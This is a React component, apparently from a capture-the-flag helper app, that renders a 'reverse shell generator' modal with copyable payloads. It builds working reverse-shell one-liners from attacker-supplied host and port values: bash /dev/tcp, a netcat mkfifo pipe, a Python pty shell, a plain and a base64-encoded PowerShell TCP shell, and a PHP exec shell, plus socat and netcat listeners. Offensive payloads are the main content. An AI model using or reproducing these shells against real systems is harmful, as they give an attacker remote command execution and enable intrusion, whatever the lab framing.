import React, { useState, useMemo } from 'react';
import { 
  X, 
  Terminal, 
  Copy, 
  Check, 
  Radio, 
  Zap, 
  ExternalLink,
  ShieldAlert,
  ArrowRight
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { useShallow } from 'zustand/react/shallow';
import { playCyberSound, safeCopyToClipboard } from '../../utils/helpers';
import { useNavigate } from 'react-router-dom';

interface ShellTemplate {
  id: string;
  name: string;
  category: 'Linux' | 'Windows' | 'Web' | 'Listener';
  command: (lhost: string, lport: string, rhost: string) => string;
}

const SHELL_TEMPLATES: ShellTemplate[] = [
  {
    id: 'bash-i',
    name: 'Bash Interactive',
    category: 'Linux',
    command: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
  },
  {
    id: 'nc-fifo',
    name: 'Netcat Mkfifo',
    category: 'Linux',
    command: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
  },
  {
    id: 'py3-pty',
    name: 'Python3 PTY Shell',
    category: 'Linux',
    command: (h, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
  },
  {
    id: 'powershell-tcp',
    name: 'PowerShell Web TCP',
    category: 'Windows',
    command: (h, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    id: 'ps-base64',
    name: 'PowerShell Encoded (b64)',
    category: 'Windows',
    command: (h, p) => {
      const script = `$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      let b64 = '';
      try {
        const codeUnits = new Uint16Array(script.length);
        for (let i = 0; i < script.length; i++) codeUnits[i] = script.charCodeAt(i);
        const charCodes = new Uint8Array(codeUnits.buffer);
        let binary = '';
        for (let i = 0; i < charCodes.byteLength; i++) binary += String.fromCharCode(charCodes[i]);
        b64 = btoa(binary);
      } catch {
        b64 = 'ENCODING_ERROR';
      }
      return `powershell -nop -enc ${b64}`;
    },
  },
  {
    id: 'php-exec',
    name: 'PHP Exec',
    category: 'Web',
    command: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    id: 'socat-listener',
    name: 'Socat TTY Listener',
    category: 'Listener',
    command: (_h, p) => `socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`,
  },
  {
    id: 'rlwrap-nc',
    name: 'RLWrap Netcat Listener',
    category: 'Listener',
    command: (_h, p) => `rlwrap nc -lvnp ${p}`,
  },
];

export const RevShellModal: React.FC = () => {
  const navigate = useNavigate();
  const {
    revShellModalOpen,
    setRevShellModalOpen,
    globalVars,
    setGlobalVars,
    soundEnabled,
  } = useCtfStore(
    useShallow((s) => ({
      revShellModalOpen: s.revShellModalOpen,
      setRevShellModalOpen: s.setRevShellModalOpen,
      globalVars: s.globalVars,
      setGlobalVars: s.setGlobalVars,
      soundEnabled: s.soundEnabled,
    }))
  );

  const [categoryFilter, setCategoryFilter] = useState<'All' | 'Linux' | 'Windows' | 'Web' | 'Listener'>('All');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const lhost = globalVars.lhost || '10.10.14.X';
  const lport = globalVars.lport || '4444';
  const rhost = globalVars.targetIp || '10.10.10.X';

  const filteredTemplates = useMemo(() => {
    if (categoryFilter === 'All') return SHELL_TEMPLATES;
    return SHELL_TEMPLATES.filter((s) => s.category === categoryFilter);
  }, [categoryFilter]);

  const handleCopy = (id: string, text: string) => {
    safeCopyToClipboard(text);
    if (soundEnabled) playCyberSound('copy');
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1800);
  };

  if (!revShellModalOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-in fade-in duration-150 font-mono">
      <div 
        className="w-full max-w-2xl bg-zinc-950 border border-zinc-800 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[85vh]"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="flex items-center justify-between px-4 py-3 bg-zinc-900/80 border-b border-zinc-800">
          <div className="flex items-center gap-2">
            <Radio className="w-4 h-4 text-cyan-400 animate-pulse" />
            <span className="font-bold text-sm text-zinc-100 uppercase tracking-wider">
              RAPID REVERSE SHELL GENERATOR
            </span>
          </div>
          <button
            onClick={() => setRevShellModalOpen(false)}
            className="p-1 rounded-lg text-zinc-400 hover:text-zinc-100 hover:bg-zinc-800 transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Live Variable Sync Strip */}
        <div className="px-4 py-3 bg-zinc-900/40 border-b border-zinc-800/80 grid grid-cols-3 gap-3 text-xs">
          <div>
            <label className="block text-[10px] text-zinc-400 uppercase font-semibold mb-1">
              LHOST (Tun0 / Attacker)
            </label>
            <input
              type="text"
              value={globalVars.lhost || ''}
              onChange={(e) => setGlobalVars({ lhost: e.target.value })}
              placeholder="10.10.14.X"
              className="w-full px-2.5 py-1.5 rounded-lg bg-zinc-900 border border-zinc-800 text-zinc-100 text-xs focus:border-cyan-500 focus:outline-none"
            />
          </div>
          <div>
            <label className="block text-[10px] text-zinc-400 uppercase font-semibold mb-1">
              LPORT (Listener)
            </label>
            <input
              type="text"
              value={globalVars.lport || ''}
              onChange={(e) => setGlobalVars({ lport: e.target.value })}
              placeholder="4444"
              className="w-full px-2.5 py-1.5 rounded-lg bg-zinc-900 border border-zinc-800 text-zinc-100 text-xs focus:border-cyan-500 focus:outline-none"
            />
          </div>
          <div>
            <label className="block text-[10px] text-zinc-400 uppercase font-semibold mb-1">
              RHOST (Active Target)
            </label>
            <input
              type="text"
              value={globalVars.targetIp || ''}
              onChange={(e) => setGlobalVars({ targetIp: e.target.value })}
              placeholder="10.10.10.X"
              className="w-full px-2.5 py-1.5 rounded-lg bg-zinc-900 border border-zinc-800 text-zinc-100 text-xs focus:border-emerald-500 focus:outline-none"
            />
          </div>
        </div>

        {/* Category Tabs */}
        <div className="flex items-center gap-1.5 px-4 py-2 bg-zinc-900/20 border-b border-zinc-800/60 overflow-x-auto text-xs">
          {(['All', 'Linux', 'Windows', 'Web', 'Listener'] as const).map((cat) => (
            <button
              key={cat}
              onClick={() => setCategoryFilter(cat)}
              className={`px-3 py-1 rounded-md text-xs font-semibold transition-all ${
                categoryFilter === cat
                  ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/50'
                  : 'text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800/60'
              }`}
            >
              {cat}
            </button>
          ))}
        </div>

        {/* Payload List */}
        <div className="p-4 space-y-3 overflow-y-auto flex-1">
          {filteredTemplates.map((t) => {
            const rawCmd = t.command(lhost, lport, rhost);
            const isCopied = copiedId === t.id;

            return (
              <div 
                key={t.id}
                className="p-3 rounded-xl bg-zinc-900/70 border border-zinc-800/80 hover:border-zinc-700 transition-all space-y-2"
              >
                <div className="flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-zinc-100">{t.name}</span>
                    <span className={`text-[9px] px-1.5 py-0.2 rounded font-semibold ${
                      t.category === 'Linux' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/30' :
                      t.category === 'Windows' ? 'bg-blue-500/10 text-blue-400 border border-blue-500/30' :
                      t.category === 'Web' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30' :
                      'bg-purple-500/10 text-purple-400 border border-purple-500/30'
                    }`}>
                      {t.category.toUpperCase()}
                    </span>
                  </div>
                  <button
                    onClick={() => handleCopy(t.id, rawCmd)}
                    className={`px-2.5 py-1 rounded-lg border text-xs font-bold transition-all flex items-center gap-1.5 ${
                      isCopied
                        ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/60'
                        : 'bg-zinc-800 hover:bg-zinc-700 text-zinc-300 hover:text-white border-zinc-700'
                    }`}
                  >
                    {isCopied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                    <span>{isCopied ? 'COPIED' : 'COPY'}</span>
                  </button>
                </div>
                <div className="p-2.5 rounded-lg bg-zinc-950 border border-zinc-800/80 text-xs font-mono text-zinc-300 break-all select-all">
                  {rawCmd}
                </div>
              </div>
            );
          })}
        </div>

        {/* Footer */}
        <div className="flex items-center justify-between px-4 py-2.5 bg-zinc-900/60 border-t border-zinc-800 text-xs text-zinc-400">
          <span>Variables auto-interpolated from active engagement context</span>
          <button
            onClick={() => {
              setRevShellModalOpen(false);
              navigate('/cheatsheets?tab=revshell');
            }}
            className="flex items-center gap-1 text-cyan-400 hover:text-cyan-300 hover:underline text-xs"
          >
            <span>Full RevShell Arsenal</span>
            <ArrowRight className="w-3.5 h-3.5" />
          </button>
        </div>
      </div>
    </div>
  );
};

export default RevShellModal;
